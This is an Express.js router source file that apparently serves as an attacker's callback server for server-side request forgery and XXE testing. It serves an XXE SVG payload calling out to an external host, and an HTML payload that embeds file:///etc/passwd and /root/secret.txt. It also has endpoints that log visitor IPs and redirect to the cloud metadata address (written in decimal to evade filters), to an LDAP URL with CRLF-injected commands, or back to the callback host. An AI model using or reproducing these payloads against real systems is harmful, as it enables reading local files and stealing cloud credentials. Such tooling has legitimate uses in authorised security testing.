var express = require('express');
var mongodb = require('../db');
var getIP = require('ipware')().get_ip;
var router = express.Router();

/* GET home page. */
router.get('/', function(req, res) {
  mongodb.getVal(res);
});

router.get('/payload', function(req, res) {
  var pay = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [<!-- an internal subset can be embedded here --><!ENTITY xxe SYSTEM "https://toiletbrush.cleverapps.io/ping">]><svg width="100%" height="100%" viewBox="0 0 100 100"     xmlns="http://www.w3.org/2000/svg">  <text x="20" y="35">My &xxe;</text></svg>'
   res.status(201).send(pay)
 });

 router.get('/payload2', function(req, res) {
   var pay = '<iframe src=file:///etc/passwd></iframe><img src="xasdasdasd" onerror="document.write(\'<iframe src=file:///etc/passwd></iframe>\')"/><link rel=attachment href="file:///root/secret.txt"><object data="file:///etc/passwd"><portal src="file:///etc/passwd" id=portal>'
       res.status(201).send(pay)
  });

 router.get('/redir', function(req, res) {
   var ipInfo = JSON.stringify(getIP(req));
     mongodb.sendVal("Redirection: " + ipInfo, 0);
    res.redirect(303, 'http://2130706433/latest/meta-data') // Notice the 303 parameter
 });

 router.get('/redir2', function(req, res) {
   var ipInfo = JSON.stringify(getIP(req));
     mongodb.sendVal("Redirection: " + ipInfo, 0);
    res.redirect(303, 'ldap://localhost:1337/%0astats%0aquit')
 });

 router.get('/redir3', function(req, res) {
   var ipInfo = JSON.stringify(getIP(req));
     mongodb.sendVal("Redirection: " + ipInfo, 0);
    res.redirect(303, 'https://toiletbrush.cleverapps.io') // Notice the 303 parameter
 });


router.get('/ping', function(req, res) {
  var ipInfo = JSON.stringify(getIP(req));
  mongodb.sendVal(ipInfo, res);
});

router.post('/values', function(req, res) {
  res.setHeader('Content-Type', 'application/json');
  var val = req.body.value;

  if (val === undefined || val === "") {
    res.send(JSON.stringify({status: "error", value: "Value undefined"}));
    return
  }
  mongodb.sendVal(val, res);
});

router.delete('/values/:id', function(req, res) {
  res.setHeader('Content-Type', 'application/json');
  var uuid = req.params.id;

  if (uuid === undefined || uuid === "") {
    res.send(JSON.stringify({status: "error", value: "UUID undefined"}));
    return
  }
  mongodb.delVal(uuid);
  res.send(JSON.stringify({status: "ok", value: uuid}));
});

module.exports = router;
